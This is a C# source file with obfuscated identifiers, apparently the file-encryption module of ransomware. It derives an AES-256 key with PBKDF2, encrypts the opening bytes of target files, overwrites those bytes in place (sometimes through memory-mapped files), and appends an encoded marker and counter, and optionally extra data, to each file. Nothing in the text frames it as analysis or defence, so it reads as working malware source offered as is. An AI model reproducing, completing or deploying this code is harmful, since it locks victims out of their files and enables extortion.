using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;

namespace WvdSzXINIqX;

public static class WffqVboAdbw
{
	public static byte[] svujRJbmtni(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = cqUOZZOGpt(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes cqUOZZOGpt(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] ZsrPQLMwHRSEDPmm(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (JenwHsdeeXa.LlSPMTfPkGWMM == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (JenwHsdeeXa.HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(JenwHsdeeXa.kCftkBXDnujA, "File: " + string_0 + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool vokiIpTrQqjl(string TgyqupHXQPS, byte[] sDetFbTBtkhqI, byte[] JOMSerecoaWty = null)
	{
		try
		{
			byte[] array = null;
			if (JenwHsdeeXa.LlSPMTfPkGWMM == "YES")
			{
				array = (JenwHsdeeXa.xSIJBVFhcrJvfz ? Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn(JenwHsdeeXa.JKVVItJdvPVmBoQr) + JenwHsdeeXa.XKJIixIieoUFn("Kw==") + Convert.ToString(JenwHsdeeXa.dlYfCorqiUsc) + JenwHsdeeXa.XKJIixIieoUFn("Kw==")) : Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn(JenwHsdeeXa.JKVVItJdvPVmBoQr) + JenwHsdeeXa.XKJIixIieoUFn("LQ==") + Convert.ToString(JenwHsdeeXa.dlYfCorqiUsc) + JenwHsdeeXa.XKJIixIieoUFn("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(TgyqupHXQPS, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(sDetFbTBtkhqI, 0, sDetFbTBtkhqI.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(TgyqupHXQPS, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!JenwHsdeeXa.xSIJBVFhcrJvfz)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(JOMSerecoaWty, 0, JOMSerecoaWty.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (JenwHsdeeXa.xSIJBVFhcrJvfz ? Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn(JenwHsdeeXa.JKVVItJdvPVmBoQr) + JenwHsdeeXa.XKJIixIieoUFn("Kw==") + Convert.ToString(JenwHsdeeXa.dlYfCorqiUsc) + JenwHsdeeXa.XKJIixIieoUFn("Kw==")) : Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn(JenwHsdeeXa.JKVVItJdvPVmBoQr) + JenwHsdeeXa.XKJIixIieoUFn("LQ==") + Convert.ToString(JenwHsdeeXa.dlYfCorqiUsc) + JenwHsdeeXa.XKJIixIieoUFn("LQ==")));
				FileStream fileStream2 = new FileStream(TgyqupHXQPS, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(sDetFbTBtkhqI, 0, sDetFbTBtkhqI.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(TgyqupHXQPS, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!JenwHsdeeXa.xSIJBVFhcrJvfz)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(JOMSerecoaWty, 0, JOMSerecoaWty.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			JenwHsdeeXa.VnshRzSTFwJvI++;
		}
		catch (Exception ex)
		{
			if (JenwHsdeeXa.HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(JenwHsdeeXa.kCftkBXDnujA, "File: " + TgyqupHXQPS + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (JenwHsdeeXa.xSIJBVFhcrJvfz ? Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn(JenwHsdeeXa.JKVVItJdvPVmBoQr) + JenwHsdeeXa.XKJIixIieoUFn("Kw==") + Convert.ToString(JenwHsdeeXa.dlYfCorqiUsc) + JenwHsdeeXa.XKJIixIieoUFn("Kw==")) : Encoding.ASCII.GetBytes(JenwHsdeeXa.XKJIixIieoUFn(JenwHsdeeXa.JKVVItJdvPVmBoQr) + JenwHsdeeXa.XKJIixIieoUFn("LQ==") + Convert.ToString(JenwHsdeeXa.dlYfCorqiUsc) + JenwHsdeeXa.XKJIixIieoUFn("LQ==")));
				FileStream fileStream4 = new FileStream(TgyqupHXQPS, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(sDetFbTBtkhqI, 0, sDetFbTBtkhqI.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(TgyqupHXQPS, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!JenwHsdeeXa.xSIJBVFhcrJvfz)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(JOMSerecoaWty, 0, JOMSerecoaWty.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}
}
